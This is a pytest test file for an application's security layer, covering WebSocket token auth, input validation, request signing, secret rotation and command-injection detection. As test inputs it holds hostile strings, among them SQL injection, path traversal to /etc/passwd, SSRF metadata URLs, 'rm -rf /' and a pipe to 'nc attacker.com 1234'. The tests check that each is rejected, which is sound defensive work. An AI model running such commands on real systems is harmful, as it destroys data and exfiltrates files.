"""Tests for advanced security features."""

import time
from unittest.mock import MagicMock

import pytest


class TestWebSocketAuth:
    """Tests for WebSocket authentication."""

    def test_extract_token_from_subprotocol(self):
        """Test extracting auth token from WebSocket subprotocol."""
        from app.security.websocket_auth import extract_token_from_subprotocol

        mock_ws = MagicMock()
        mock_ws.headers = {"sec-websocket-protocol": "copilot-v1, auth-dcp_test_token_123"}

        token = extract_token_from_subprotocol(mock_ws)
        assert token == "dcp_test_token_123"

    def test_extract_token_no_auth(self):
        """Test when no auth token is provided."""
        from app.security.websocket_auth import extract_token_from_subprotocol

        mock_ws = MagicMock()
        mock_ws.headers = {"sec-websocket-protocol": "copilot-v1"}

        token = extract_token_from_subprotocol(mock_ws)
        assert token is None

    def test_reject_malformed_token(self):
        """Test that malformed tokens are rejected."""
        from app.security.websocket_auth import extract_token_from_subprotocol

        mock_ws = MagicMock()
        mock_ws.headers = {"sec-websocket-protocol": "auth-<script>alert(1)</script>"}

        token = extract_token_from_subprotocol(mock_ws)
        assert token is None

    def test_reject_short_token(self):
        """Test that short tokens are rejected."""
        from app.security.websocket_auth import extract_token_from_subprotocol

        mock_ws = MagicMock()
        mock_ws.headers = {"sec-websocket-protocol": "auth-short"}

        token = extract_token_from_subprotocol(mock_ws)
        assert token is None

    def test_get_accepted_subprotocol(self):
        """Test subprotocol selection."""
        from app.security.websocket_auth import get_accepted_subprotocol

        mock_ws = MagicMock()
        mock_ws.headers = {"sec-websocket-protocol": "copilot-v1, auth-token123abc"}

        proto = get_accepted_subprotocol(mock_ws)
        assert proto == "copilot-v1"


class TestInputValidation:
    """Tests for input validation."""

    def test_validate_string_length(self):
        """Test string length validation."""
        from app.security.input_validation import validate_string

        result = validate_string("a" * 100, max_length=50)
        assert not result.valid
        assert any("length" in v.lower() for v in result.violations)

    def test_validate_sql_injection(self):
        """Test SQL injection detection."""
        from app.security.input_validation import validate_string

        result = validate_string("'; DROP TABLE users; --", context="sql")
        assert not result.valid
        assert any("sql" in v.lower() for v in result.violations)

    def test_validate_path_traversal(self):
        """Test path traversal detection."""
        from app.security.input_validation import validate_string

        result = validate_string("../../../etc/passwd", context="path")
        assert not result.valid
        assert any("traversal" in v.lower() for v in result.violations)

    def test_validate_url_ssrf_metadata(self):
        """Test SSRF protection for cloud metadata."""
        from app.security.input_validation import validate_url

        result = validate_url("http://169.254.169.254/latest/meta-data/")
        assert not result.valid

    def test_validate_url_ssrf_localhost(self):
        """Test SSRF protection for localhost."""
        from app.security.input_validation import validate_url

        result = validate_url("http://localhost:8080/admin")
        assert not result.valid

    def test_validate_url_ssrf_loopback(self):
        """Test SSRF protection for loopback."""
        from app.security.input_validation import validate_url

        result = validate_url("http://127.0.0.1/admin")
        assert not result.valid

    def test_validate_url_allowed(self):
        """Test valid URLs pass validation."""
        from app.security.input_validation import validate_url

        result = validate_url("https://api.github.com/repos/owner/repo")
        assert result.valid

    def test_validate_github_repo_valid(self):
        """Test valid GitHub repo formats."""
        from app.security.input_validation import validate_github_repo

        assert validate_github_repo("owner/repo").valid
        assert validate_github_repo("https://github.com/owner/repo").valid
        assert validate_github_repo("github.com/owner/repo.git").valid

    def test_validate_github_repo_invalid(self):
        """Test invalid GitHub repo formats."""
        from app.security.input_validation import validate_github_repo

        assert not validate_github_repo("just-a-name").valid
        assert not validate_github_repo("../../../etc/passwd").valid

    def test_unicode_normalization(self):
        """Test Unicode normalization prevents bypasses."""
        from app.security.input_validation import normalize_unicode

        assert normalize_unicode("ｓｃｒｉｐｔ") == "script"

        result = normalize_unicode("scr​ipt")
        assert "​" not in result

    def test_validate_thread_id_valid(self):
        """Test valid thread IDs."""
        from app.security.input_validation import validate_thread_id

        assert validate_thread_id("thread-123").valid
        assert validate_thread_id("inv_abc:xyz").valid

    def test_validate_thread_id_path_traversal(self):
        """Test thread ID path traversal detection."""
        from app.security.input_validation import validate_thread_id

        assert not validate_thread_id("../etc/passwd").valid
        assert not validate_thread_id("thread/../../secret").valid

    def test_sanitize_for_logging(self):
        """Test log sanitization."""
        from app.security.input_validation import sanitize_for_logging

        result = sanitize_for_logging("line1\nline2\rline3")
        assert "\n" not in result
        assert "\r" not in result
        assert "\\n" in result
        assert "\\r" in result


class TestRequestSigning:
    """Tests for request signing."""

    def test_compute_and_validate_signature(self):
        """Test signature computation and validation."""
        from app.security.request_signing import compute_signature, validate_signature

        payload = b'{"action": "test"}'
        secret = "test-secret-key"

        signature, timestamp = compute_signature(payload, secret)

        result = validate_signature(payload, signature, timestamp, secret)
        assert result.valid

    def test_reject_old_timestamp(self):
        """Test that old timestamps are rejected."""
        from app.security.request_signing import compute_signature, validate_signature

        payload = b'{"action": "test"}'
        secret = "test-secret-key"
        old_timestamp = int(time.time()) - 600

        signature, _ = compute_signature(payload, secret, old_timestamp)

        result = validate_signature(payload, signature, old_timestamp, secret)
        assert not result.valid
        assert "old" in result.error.lower() or "future" in result.error.lower()

    def test_reject_tampered_payload(self):
        """Test that tampered payloads are rejected."""
        from app.security.request_signing import compute_signature, validate_signature

        original = b'{"amount": 100}'
        tampered = b'{"amount": 10000}'
        secret = "test-secret-key"

        signature, timestamp = compute_signature(original, secret)

        result = validate_signature(tampered, signature, timestamp, secret)
        assert not result.valid
        assert "mismatch" in result.error.lower()

    def test_idempotency_tracking(self):
        """Test idempotency key tracking."""
        from app.security.request_signing import check_idempotency, record_idempotency_result

        key = f"idem-{time.time()}"

        is_dup, cached = check_idempotency(key)
        assert not is_dup
        assert cached is None

        record_idempotency_result(key, {"status": "success"})

        is_dup, cached = check_idempotency(key)
        assert is_dup
        assert cached == {"status": "success"}

    def test_parse_stripe_header(self):
        """Test parsing Stripe signature header."""
        from app.security.request_signing import parse_signature_header

        header = "t=1234567890,v1=abc123signature"
        result = parse_signature_header(header, "stripe")

        assert result["timestamp"] == 1234567890
        assert result["signature"] == "abc123signature"
        assert result["version"] == "v1"

    def test_parse_github_header(self):
        """Test parsing GitHub signature header."""
        from app.security.request_signing import parse_signature_header

        header = "sha256=abc123signature"
        result = parse_signature_header(header, "github")

        assert result["signature"] == "abc123signature"
        assert result["version"] == "sha256"


class TestSecretRotation:
    """Tests for secret rotation."""

    @pytest.mark.asyncio
    async def test_register_and_get_secret(self):
        """Test registering and retrieving a secret."""
        from app.security.secret_rotation import SecretRotationManager

        manager = SecretRotationManager()

        manager.register_secret("api-key", "initial-value", rotation_interval_days=30)

        assert manager.get_current("api-key") == "initial-value"
        assert manager.validate("api-key", "initial-value")
        assert not manager.validate("api-key", "wrong-value")

    @pytest.mark.asyncio
    async def test_rotate_secret(self):
        """Test rotating a secret."""
        from app.security.secret_rotation import SecretRotationManager

        manager = SecretRotationManager(default_grace_period_hours=1)
        manager.register_secret("api-key", "old-value")

        success, new_value = await manager.rotate("api-key", "new-value")

        assert success
        assert new_value == "new-value"
        assert manager.get_current("api-key") == "new-value"

        assert manager.validate("api-key", "new-value")
        assert manager.validate("api-key", "old-value")

    @pytest.mark.asyncio
    async def test_grace_period_end(self):
        """Test ending grace period."""
        from app.security.secret_rotation import SecretRotationManager

        manager = SecretRotationManager()
        manager.register_secret("api-key", "old-value")

        await manager.rotate("api-key", "new-value")
        assert manager.validate("api-key", "old-value")

        await manager.end_grace_period("api-key")
        assert manager.validate("api-key", "new-value")
        assert not manager.validate("api-key", "old-value")

    @pytest.mark.asyncio
    async def test_rollback(self):
        """Test rolling back a rotation."""
        from app.security.secret_rotation import SecretRotationManager

        manager = SecretRotationManager()
        manager.register_secret("api-key", "old-value")

        await manager.rotate("api-key", "new-value")
        success = await manager.rollback("api-key", "Found issue")

        assert success
        assert manager.get_current("api-key") == "old-value"

    @pytest.mark.asyncio
    async def test_auto_generate_value(self):
        """Test auto-generating a new secret value."""
        from app.security.secret_rotation import SecretRotationManager

        manager = SecretRotationManager()
        manager.register_secret("api-key", "old-value")

        success, new_value = await manager.rotate("api-key")

        assert success
        assert new_value != "old-value"
        assert len(new_value) > 20

    def test_needs_rotation(self):
        """Test rotation need detection."""
        from datetime import datetime, timedelta, timezone

        from app.security.secret_rotation import SecretRotationManager

        manager = SecretRotationManager()
        manager.register_secret("api-key", "value", rotation_interval_days=90)

        assert not manager.needs_rotation("api-key")

        _, metadata = manager._secrets["api-key"]
        metadata.expires_at = datetime.now(timezone.utc) - timedelta(days=1)

        assert manager.needs_rotation("api-key")

    def test_get_expiring_soon(self):
        """Test finding secrets expiring soon."""
        from app.security.secret_rotation import SecretRotationManager

        manager = SecretRotationManager()
        manager.register_secret("key1", "value1", rotation_interval_days=3)
        manager.register_secret("key2", "value2", rotation_interval_days=30)

        expiring = manager.get_expiring_soon(within_days=7)
        assert "key1" in expiring
        assert "key2" not in expiring

    def test_rotation_events(self):
        """Test rotation event tracking."""
        from app.security.secret_rotation import SecretRotationManager

        manager = SecretRotationManager()
        manager.register_secret("api-key", "value")

        events = manager.get_events("api-key")
        assert len(events) == 0

    @pytest.mark.asyncio
    async def test_rotation_event_recorded(self):
        """Test that rotation events are recorded."""
        from app.security.secret_rotation import RotationStatus, SecretRotationManager

        manager = SecretRotationManager()
        manager.register_secret("api-key", "old-value")

        await manager.rotate("api-key", "new-value")

        events = manager.get_events("api-key")
        assert len(events) == 1
        assert events[0].status == RotationStatus.GRACE_PERIOD


class TestCommandInjection:
    """Tests for command injection detection."""

    def test_detect_semicolon_injection(self):
        """Test detection of semicolon command injection."""
        from app.security.input_validation import validate_string

        result = validate_string("; rm -rf /", context="command")
        assert not result.valid

    def test_detect_pipe_injection(self):
        """Test detection of pipe command injection."""
        from app.security.input_validation import validate_string

        result = validate_string("cat file | nc attacker.com 1234", context="command")
        assert not result.valid

    def test_detect_subshell_injection(self):
        """Test detection of subshell command injection."""
        from app.security.input_validation import validate_string

        result = validate_string("$(whoami)", context="command")
        assert not result.valid

    def test_detect_backtick_injection(self):
        """Test detection of backtick command injection."""
        from app.security.input_validation import validate_string

        result = validate_string("`id`", context="command")
        assert not result.valid
